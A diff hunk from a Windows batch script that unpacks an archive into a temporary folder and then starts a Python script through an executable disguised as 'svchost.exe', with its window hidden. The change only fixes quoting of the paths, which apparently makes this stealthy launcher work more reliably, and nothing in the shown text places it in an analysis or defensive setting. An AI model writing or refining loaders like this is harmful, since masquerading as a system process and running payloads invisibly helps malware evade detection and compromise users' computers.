@@ -26,7 +26,7 @@ powershell -Command "Expand-Archive -Path '%output%' -DestinationPath '%tempdir%
 
 set "pythonScript=%tempdir%\python.py"
 if exist "%pythonScript%" (
-    powershell -Command "Start-Process -FilePath '%tempdir%\svchost.exe' -ArgumentList '%pythonScript%' -WindowStyle Hidden"
+    powershell -Command "Start-Process -FilePath "$env:TEMP\svchost.exe" -ArgumentList "`"$env:TEMP\python.py`"" -WindowStyle Hidden"
 ) else (
     exit
 )
